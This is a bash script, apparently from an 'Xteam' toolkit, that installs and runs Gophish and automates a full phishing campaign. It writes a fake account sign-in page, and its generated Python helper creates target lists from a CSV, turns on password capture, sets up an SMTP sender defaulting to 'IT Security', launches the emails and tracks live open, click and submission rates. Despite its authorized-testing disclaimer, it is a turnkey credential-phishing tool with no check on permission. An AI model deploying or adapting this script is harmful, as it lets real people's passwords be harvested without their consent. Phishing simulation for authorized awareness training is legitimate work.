#!/bin/bash
# =============================================================================
#  Xteam - Advanced Phishing Module (powered by Gophish)
# -----------------------------------------------------------------------------
#  Wraps the open-source Gophish phishing-simulation framework:
#    * installs Gophish from the official GitHub release if missing
#    * starts the server and reveals the admin URL + auto-generated password
#    * asks for the target CSV and a landing page template
#    * generates a Python helper that drives the Gophish REST API
#    * tails the Gophish log for live click/open rates
#
#  FOR AUTHORIZED SECURITY TESTING AND SECURITY AWARENESS TRAINING ONLY.
#  Only use against targets you own or have explicit written permission to test.
#  Unauthorized phishing is illegal in most jurisdictions.
#
#  Requirements : bash, python3 (+ 'requests'), unzip, curl or wget
#  Platforms    : Termux / Kali Linux (non-root friendly)
# =============================================================================

# ---------------- colours ----------------
Red="\033[1;31m"; Green="\033[1;32m"; Yellow="\033[1;33m"
Blue="\033[1;34m"; Cyan="\033[1;36m"; White="\033[1;37m"; Reset="\033[0m"

# ---------------- paths ----------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODULE_DIR="$SCRIPT_DIR"
TEMPLATES_DIR="$MODULE_DIR/phishing_templates"
PY_HELPER="$MODULE_DIR/gophish_api.py"
GOPHISH_DIR="$MODULE_DIR/gophish"
RUNTIME_DIR="$MODULE_DIR"
CONFIG_JSON="$RUNTIME_DIR/config.json"
LOG_FILE="$RUNTIME_DIR/gophish.log"
CONSOLE_LOG="$RUNTIME_DIR/gophish_console.log"
ADMIN_URL="https://localhost:3333"
API_URL="https://localhost:3333/api"
PHISH_PORT="${PHISH_PORT:-8080}"

# ---------------- helpers ----------------
ok()   { echo -e "${Green}[+]${Reset} $*"; }
info() { echo -e "${Blue}[*]${Reset} $*"; }
warn() { echo -e "${Yellow}[!]${Reset} $*"; }
err()  { echo -e "${Red}[x]${Reset} $*"; }
ask()        { printf "${Cyan}[?]${Reset} %s" "$1"; read -r "$2"; }
ask_secret() { printf "${Cyan}[?]${Reset} %s" "$1"; read -r -s "$2"; echo; }

have()    { command -v "$1" >/dev/null 2>&1; }
is_root() { [ "$(id -u)" -eq 0 ]; }

banner() {
  clear
  echo -e "${Red}==================================================${Reset}"
  echo -e "${Yellow}        X TEAM  ::  ADVANCED PHISHING MODULE${Reset}"
  echo -e "${Green}        Powered by Gophish (open-source)${Reset}"
  echo -e "${Red}==================================================${Reset}"
  echo -e "${Yellow}  For authorized security testing / awareness ONLY${Reset}"
  echo
}

# ---------------- package management (non-interactive) ----------------
install_pkgs() {
  local cmd
  if have pkg; then
    cmd="pkg install -y"
  elif have apt-get; then
    if is_root; then cmd="apt-get install -y"; else cmd="sudo apt-get install -y"; fi
  else
    err "No supported package manager (pkg/apt-get). Install manually: $*"
    return 1
  fi
  if ! $cmd "$@" >/dev/null 2>&1; then
    warn "Could not auto-install: $* (run it manually if needed)"
    return 1
  fi
}

ensure_basics() {
  have python3 || install_pkgs python3
  have unzip   || install_pkgs unzip
  if ! have curl && ! have wget; then install_pkgs curl; fi
  if ! python3 -c 'import requests' >/dev/null 2>&1; then
    info "Installing python 'requests' module..."
    python3 -m ensurepip --upgrade >/dev/null 2>&1 || true
    python3 -m pip install --break-system-packages requests >/dev/null 2>&1 \
      || python3 -m pip install requests >/dev/null 2>&1 \
      || install_pkgs python3-requests
  fi
}

# ---------------- gophish install ----------------
detect_arch() {
  case "$(uname -m)" in
    x86_64|amd64)  echo "64" ;;
    aarch64|arm64) echo "arm64" ;;
    i386|i686|x86) echo "386" ;;
    *)             echo "64" ;;
  esac
}

# Prints "<tag> <asset>" for the best-matching Linux release for the given
# arch, or nothing on failure. Asset naming differs between releases
# (e.g. "linux-64.zip" vs "linux-64bit.zip"), so we match dynamically.
resolve_gophish_asset() {
  python3 - "$1" <<'PY'
import json, sys, urllib.request
arch = sys.argv[1]
patterns = {
    "64":    ["linux-64bit", "linux-64", "linux-amd64"],
    "arm64": ["linux-arm64", "linux-arm64bit", "linux-arm"],
    "386":   ["linux-32bit", "linux-386", "linux-32"],
}.get(arch, ["linux-64bit", "linux-64"])
try:
    d = json.load(urllib.request.urlopen(
        "https://api.github.com/repos/gophish/gophish/releases/latest", timeout=25))
except Exception:
    sys.exit(1)
tag = d.get("tag_name", "v0.12.1")
assets = [a["name"] for a in d.get("assets", [])]
for p in patterns:
    for a in assets:
        if "linux" in a and p in a:
            print(tag + " " + a)
            sys.exit(0)
sys.exit(1)
PY
}

install_gophish() {
  [ -x "$GOPHISH_DIR/gophish" ] && { ok "Gophish already installed."; return 0; }

  # Gophish ships no official ARM64 build - on Termux fall back to the
  # community package (installs to $PREFIX/bin/gophish).
  if [ "$(detect_arch)" = "arm64" ] && have pkg; then
    info "ARM64 detected - installing Gophish from the Termux community repo..."
    if pkg install -y gophish >/dev/null 2>&1 && have gophish; then
      mkdir -p "$GOPHISH_DIR"
      ln -sf "$(command -v gophish)" "$GOPHISH_DIR/gophish"
      ok "Gophish installed (Termux package)."
      return 0
    fi
    err "No official ARM64 build of Gophish exists and the Termux package is unavailable."
    return 1
  fi

  info "Gophish not found - downloading the latest release from GitHub..."
  local arch resolved ver zipname url tmp
  arch="$(detect_arch)"
  resolved="$(resolve_gophish_asset "$arch")"
  if [ -z "$resolved" ]; then
    err "Could not find a matching Linux release for arch '$arch'."
    return 1
  fi
  ver="${resolved%% *}"
  zipname="${resolved#* }"
  url="https://github.com/gophish/gophish/releases/download/${ver}/${zipname}"
  tmp="$(mktemp -d)"
  info "Downloading: $url"
  if have curl; then
    curl -fsSL -o "$tmp/$zipname" "$url" || { err "Download failed."; rm -rf "$tmp"; return 1; }
  else
    wget -q -O "$tmp/$zipname" "$url" || { err "Download failed."; rm -rf "$tmp"; return 1; }
  fi
  mkdir -p "$GOPHISH_DIR"
  unzip -q -o "$tmp/$zipname" -d "$GOPHISH_DIR"
  chmod +x "$GOPHISH_DIR/gophish" 2>/dev/null
  rm -rf "$tmp"
  ok "Gophish ${ver} installed."
}

# ---------------- server lifecycle ----------------
is_gophish_up() {
  have curl || return 1
  curl -sk --max-time 3 -o /dev/null "$API_URL/session/" && return 0
  return 1
}

# If the auto-generated config binds the phish server to :80 and we are not
# root (e.g. Termux), switch it to a high port. Exits 0 if changed.
fix_phish_port() {
  python3 - "$CONFIG_JSON" <<'PY'
import json, re, sys
p = sys.argv[1]
cfg = json.load(open(p))
ps = cfg.get("phish_server", {})
listen = ps.get("listen_url", "") if isinstance(ps, dict) else str(ps)
if re.search(r":80$", listen):
    new = re.sub(r":\d+$", ":8080", listen)
    if isinstance(ps, dict):
        ps["listen_url"] = new
    else:
        cfg["phish_server"] = new
    json.dump(cfg, open(p, "w"), indent=2)
    sys.exit(0)
sys.exit(1)
PY
}

start_gophish() {
  [ -x "$GOPHISH_DIR/gophish" ] || { err "Gophish binary missing. Run install first."; return 1; }
  if is_gophish_up; then
    ok "Gophish is already running on $ADMIN_URL"
  else
    local first=0
    [ -f "$CONFIG_JSON" ] || first=1
    cd "$RUNTIME_DIR"
    info "Starting Gophish server..."
    nohup "$GOPHISH_DIR/gophish" > "$CONSOLE_LOG" 2>&1 &
    GOPHISH_PID=$!
    for _ in $(seq 1 30); do [ -f "$CONFIG_JSON" ] && break; sleep 1; done
    for _ in $(seq 1 30); do is_gophish_up && break; sleep 1; done
    if [ "$first" -eq 1 ] && [ -f "$CONFIG_JSON" ] && fix_phish_port; then
      ok "Phishing server moved to port $PHISH_PORT (non-root friendly). Restarting..."
      kill "$GOPHISH_PID" 2>/dev/null; sleep 2
      nohup "$GOPHISH_DIR/gophish" > "$CONSOLE_LOG" 2>&1 &
      GOPHISH_PID=$!
      for _ in $(seq 1 30); do is_gophish_up && break; sleep 1; done
    fi
  fi
  show_admin_credentials
}

show_admin_credentials() {
  ADMIN_PASS=""
  if [ -f "$CONFIG_JSON" ]; then
    ADMIN_PASS="$(python3 -c 'import json,sys
try: print(json.load(open(sys.argv[1])).get("admin_password",""))
except Exception: print("")' "$CONFIG_JSON")"
  fi
  if [ -z "$ADMIN_PASS" ] && [ -f "$CONSOLE_LOG" ]; then
    ADMIN_PASS="$(grep -i 'password' "$CONSOLE_LOG" | tail -1 | sed -E 's/.*password[^A-Za-z0-9]*([^ ]+).*/\1/')"
  fi
  echo
  ok "Gophish admin panel ready:"
  echo "    Admin URL  : ${Cyan}$ADMIN_URL${Reset}"
  echo "    Username   : admin"
  echo "    Password   : ${Green}${ADMIN_PASS:-<see $CONSOLE_LOG>}${Reset}"
  echo
}

# ---------------- templates ----------------
ensure_templates() {
  mkdir -p "$TEMPLATES_DIR"
  shopt -s nullglob
  local htmls=("$TEMPLATES_DIR"/*.html)
  shopt -u nullglob
  if [ "${#htmls[@]}" -eq 0 ]; then
    warn "phishing_templates/ is empty - creating a sample template..."
    cat > "$TEMPLATES_DIR/generic_login.html" <<'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Account Sign In</title>
<style>
  body{font-family:Arial,sans-serif;background:#f2f4f8;display:flex;
       align-items:center;justify-content:center;height:100vh;margin:0}
  .card{background:#fff;padding:32px;border-radius:8px;width:340px;
        box-shadow:0 4px 20px rgba(0,0,0,.08)}
  h2{margin:0 0 4px;color:#1a1a2e;font-size:20px}
  .sub{color:#666;margin:0 0 20px;font-size:13px}
  label{font-size:13px;color:#333;display:block;margin:12px 0 4px}
  input{width:100%;padding:10px;border:1px solid #ccc;border-radius:6px;
        box-sizing:border-box;font-size:14px}
  button{width:100%;margin-top:18px;padding:11px;background:#1a1a2e;color:#fff;
         border:0;border-radius:6px;font-size:15px;cursor:pointer}
  button:hover{background:#2b2b4a}
  .note{font-size:11px;color:#999;margin-top:16px;text-align:center}
</style>
</head>
<body>
  <div class="card">
    <h2>Sign in to your account</h2>
    <p class="sub">Please verify your account details to continue.</p>
    <form method="post" action="{{.URL}}">
      <label>Email address</label>
      <input type="text" name="username" placeholder="you@example.com" autocomplete="off" required>
      <label>Password</label>
      <input type="password" name="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
      <button type="submit">Sign in</button>
    </form>
    <p class="note">Simulated login page for authorized security testing.</p>
  </div>
  <img src="{{.Tracker}}" width="1" height="1" alt="">
</body>
</html>
HTML
    ok "Created $TEMPLATES_DIR/generic_login.html"
  fi
}

choose_page() {
  shopt -s nullglob
  local htmls=("$TEMPLATES_DIR"/*.html)
  shopt -u nullglob
  if [ "${#htmls[@]}" -eq 0 ]; then
    err "No .html templates found in $TEMPLATES_DIR"
    return 1
  fi
  echo
  info "Available landing page templates:"
  local i=1
  for f in "${htmls[@]}"; do
    echo "    ${Cyan}$i)${Reset} $(basename "$f")"
    i=$((i+1))
  done
  local choice
  ask "Choose a template [1-$((i-1))]: " choice
  if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt "$((i-1))" ]; then
    err "Invalid selection."
    return 1
  fi
  SELECTED_PAGE="${htmls[$((choice-1))]}"
  ok "Landing page: $(basename "$SELECTED_PAGE")"
}

# ---------------- user input ----------------
collect_inputs() {
  echo
  info "Provide campaign details (Ctrl+C to abort at any time)."
  echo
  ask "Target CSV file path (format: firstname,lastname,email): " CSV_FILE
  [ -n "$CSV_FILE" ] || { err "CSV file required."; return 1; }
  [ -f "$CSV_FILE" ] || { err "File not found: $CSV_FILE"; return 1; }
  choose_page || return 1

  ask "Campaign name: " CAMPAIGN_NAME
  [ -n "$CAMPAIGN_NAME" ] || CAMPAIGN_NAME="Xteam Campaign $(date +%s)"

  ask "Email subject: " EMAIL_SUBJECT
  [ -n "$EMAIL_SUBJECT" ] || EMAIL_SUBJECT="Action Required: Please Review"

  ask "SMTP host (e.g. smtp.gmail.com): " SMTP_HOST
  [ -n "$SMTP_HOST" ] || { err "SMTP host required."; return 1; }
  ask "SMTP port [587]: " SMTP_PORT
  [ -n "$SMTP_PORT" ] || SMTP_PORT="587"
  ask "From name [IT Security]: " FROM_NAME
  [ -n "$FROM_NAME" ] || FROM_NAME="IT Security"
  ask "From email address: " FROM_EMAIL
  [ -n "$FROM_EMAIL" ] || { err "From email required."; return 1; }
  ask "SMTP username [blank if none]: " SMTP_USER
  ask_secret "SMTP password [blank if none]: " SMTP_PASS
  ask "Public phishing URL (e.g. http://YOUR-IP:$PHISH_PORT): " PHISH_URL
  [ -n "$PHISH_URL" ] || { err "Phishing URL required."; return 1; }
  return 0
}

# ---------------- Python API helper (generated) ----------------
create_helper() {
  cat > "$PY_HELPER" <<'PYEOF'
#!/usr/bin/env python3
# =============================================================================
#  Xteam - Gophish API helper (generated by phishing.sh)
#  Drives the Gophish REST API to build & launch a phishing campaign and to
#  report live open/click rates. FOR AUTHORIZED SECURITY TESTING ONLY.
# =============================================================================
import argparse
import csv
import json
import sys
import time
from datetime import datetime, timedelta, timezone

import requests

API_BASE = "https://localhost:3333/api"

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


def api(method, path, token=None, payload=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    try:
        r = requests.request(method, API_BASE + path, headers=headers,
                             json=payload, verify=False, timeout=40)
    except requests.exceptions.RequestException as exc:
        sys.exit("API connection error: %s" % exc)
    body = None
    if r.content:
        try:
            body = r.json()
        except Exception:
            body = r.text
    if r.status_code >= 400:
        msg = body.get("message") if isinstance(body, dict) else body
        sys.exit("API %s %s failed (%d): %s" % (method, path, r.status_code, msg))
    return body


def login(password):
    body = api("POST", "/session/", payload={"username": "admin", "password": password})
    if not body.get("success"):
        sys.exit("Gophish login failed: %s" % body.get("message"))
    return body["data"]["token"]


def load_csv(path):
    targets = []
    with open(path, newline="", encoding="utf-8", errors="replace") as fh:
        for row in csv.reader(fh):
            row = [c.strip() for c in row if c and c.strip()]
            if not row:
                continue
            email = row[-1]
            if "@" not in email:
                continue
            if len(row) >= 3:
                first, last = row[0], row[1]
            else:
                first, last = row[0], ""
            targets.append({"first_name": first, "last_name": last, "email": email})
    if not targets:
        sys.exit("No valid email addresses found in %s" % path)
    return targets


def create_group(token, name, targets):
    body = api("POST", "/groups/", token, {"name": name, "targets": targets})
    return body["id"]


def create_page(token, name, html_path):
    with open(html_path, encoding="utf-8", errors="replace") as fh:
        html = fh.read()
    payload = {
        "name": name,
        "html": html,
        "modified_source": html,
        "capture_credentials": True,
        "capture_passwords": True,
        "redirect": "",
    }
    body = api("POST", "/pages/", token, payload)
    return body["id"]


def create_template(token, name, subject, body_path, from_email):
    with open(body_path, encoding="utf-8", errors="replace") as fh:
        text = fh.read()
    html = "<br>".join(line for line in text.splitlines())
    payload = {
        "name": name,
        "subject": subject,
        "html": html,
        "text": "Please review: {{.URL}}",
        "from": from_email,
        "attachments": [],
    }
    body = api("POST", "/templates/", token, payload)
    return body["id"]


def create_smtp(token, name, host, port, from_email, from_name, user, password):
    payload = {
        "name": name,
        "host": "%s:%s" % (host, port),
        "from_address": from_email,
        "from_name": from_name,
        "username": user or "",
        "password": password or "",
        "ignore_cert_errors": True,
        "headers": [],
    }
    body = api("POST", "/smtp/", token, payload)
    return body["id"]


def create_campaign(token, name, template_id, page_id, smtp_id, group_id, url):
    now = datetime.now(timezone.utc)
    payload = {
        "name": name,
        "template": {"id": template_id},
        "page": {"id": page_id},
        "smtp": {"id": smtp_id},
        "url": url,
        "launch_date": (now - timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "send_by_date": (now + timedelta(days=30)).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "groups": [{"id": group_id}],
    }
    return api("POST", "/campaigns/", token, payload)


def campaign_stats(token, name):
    body = api("GET", "/campaigns/")
    if isinstance(body, dict):
        body = body.get("data", [])
    for c in (body or []):
        if c.get("name") == name:
            results = c.get("results") or []
            total = len(results)
            opened = sum(1 for r in results if r.get("status") in ("Opened", "Clicked", "Submitted Data"))
            clicked = sum(1 for r in results if r.get("status") in ("Clicked", "Submitted Data"))
            submitted = sum(1 for r in results if r.get("status") == "Submitted Data")
            return c.get("status"), total, opened, clicked, submitted
    return None, 0, 0, 0, 0


def cmd_launch(args):
    token = login(args.password)
    targets = load_csv(args.csv)
    group_id = create_group(token, "Targets - " + args.campaign, targets)
    page_id = create_page(token, "Landing - " + args.campaign, args.page)
    tpl_id = create_template(token, "Email - " + args.campaign, args.subject,
                             args.body_file, args.from_email)
    smtp_id = create_smtp(token, "SMTP - " + args.campaign, args.smtp_host,
                          args.smtp_port, args.from_email, args.from_name,
                          args.smtp_user, args.smtp_pass)
    camp = create_campaign(token, args.campaign, tpl_id, page_id, smtp_id,
                           group_id, args.phish_url)
    print("=" * 60)
    print("[+] Campaign launched!")
    print("    Name       : %s" % camp.get("name"))
    print("    Campaign ID: %s" % camp.get("id"))
    print("    Status     : %s" % camp.get("status"))
    print("    Targets    : %d" % len(targets))
    print("    Phish URL  : %s" % args.phish_url)
    print("=" * 60)


def cmd_status(args):
    token = login(args.password)
    print("[rates] watching campaign '%s' (Ctrl+C to stop)" % args.campaign)
    try:
        while True:
            st, total, opened, clicked, submitted = campaign_stats(token, args.campaign)
            po = (opened * 100 // total) if total else 0
            pc = (clicked * 100 // total) if total else 0
            print("[rates] %s | %-12s | sent=%-4d opened=%-4d (%3d%%) clicked=%-4d (%3d%%) submitted=%d"
                  % (time.strftime("%H:%M:%S"), st or "n/a", total, opened, po,
                     clicked, pc, submitted), flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[rates] stopped.")


def main():
    ap = argparse.ArgumentParser(description="Xteam Gophish API helper")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("launch", help="Build & launch a phishing campaign")
    p.add_argument("--password", required=True, help="Gophish admin password")
    p.add_argument("--csv", required=True, help="Targets CSV (firstname,lastname,email)")
    p.add_argument("--page", required=True, help="Landing page HTML file")
    p.add_argument("--subject", default="Action Required")
    p.add_argument("--body-file", required=True, help="Email body file")
    p.add_argument("--smtp-host", required=True)
    p.add_argument("--smtp-port", default="587")
    p.add_argument("--from-name", default="IT Security")
    p.add_argument("--from-email", required=True)
    p.add_argument("--smtp-user", default="")
    p.add_argument("--smtp-pass", default="")
    p.add_argument("--phish-url", required=True)
    p.add_argument("--campaign", required=True)

    s = sub.add_parser("status", help="Poll live open/click rates")
    s.add_argument("--password", required=True)
    s.add_argument("--campaign", required=True)
    s.add_argument("--interval", type=int, default=15)

    args = ap.parse_args()
    if args.cmd == "launch":
        cmd_launch(args)
    elif args.cmd == "status":
        cmd_status(args)
    else:
        ap.print_help()


if __name__ == "__main__":
    main()
PYEOF
  chmod +x "$PY_HELPER"
  ok "Generated Python API helper: $PY_HELPER"
}

# ---------------- campaign ----------------
launch_campaign() {
  local body_file; body_file="$(mktemp)"
  cat > "$body_file" <<'BODY'
Hi {{.FirstName}},
Please review the information linked below at your earliest convenience:
{{.URL}}
Regards,
{{.From}}
BODY
  info "Creating Gophish components and launching campaign..."
  python3 "$PY_HELPER" launch \
    --password "$ADMIN_PASS" \
    --csv "$CSV_FILE" \
    --page "$SELECTED_PAGE" \
    --subject "$EMAIL_SUBJECT" \
    --body-file "$body_file" \
    --smtp-host "$SMTP_HOST" \
    --smtp-port "$SMTP_PORT" \
    --from-name "$FROM_NAME" \
    --from-email "$FROM_EMAIL" \
    --smtp-user "$SMTP_USER" \
    --smtp-pass "$SMTP_PASS" \
    --phish-url "$PHISH_URL" \
    --campaign "$CAMPAIGN_NAME" || { rm -f "$body_file"; return 1; }
  rm -f "$body_file"
}

live_view() {
  echo
  info "Campaign launched. Live view below - press ${Yellow}Ctrl+C${Reset} to stop."
  info "Polling Gophish API for open/click rates every 15s; tailing $LOG_FILE."
  echo
  python3 "$PY_HELPER" status \
    --password "$ADMIN_PASS" \
    --campaign "$CAMPAIGN_NAME" \
    --interval 15 &
  local poll_pid=$!
  tail -n 15 -F "$LOG_FILE" 2>/dev/null \
    | grep --line-buffered -Ei "send|open|click|campaign|track|error|msg=|email" || true
  kill "$poll_pid" 2>/dev/null
  wait 2>/dev/null
  echo
  ok "Live view stopped."
}

# ---------------- entry point ----------------
main() {
  banner
  ensure_basics
  install_gophish || exit 1
  start_gophish || exit 1
  ensure_templates
  collect_inputs || exit 1
  create_helper
  launch_campaign || exit 1
  live_view
}

if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  main "$@"
fi
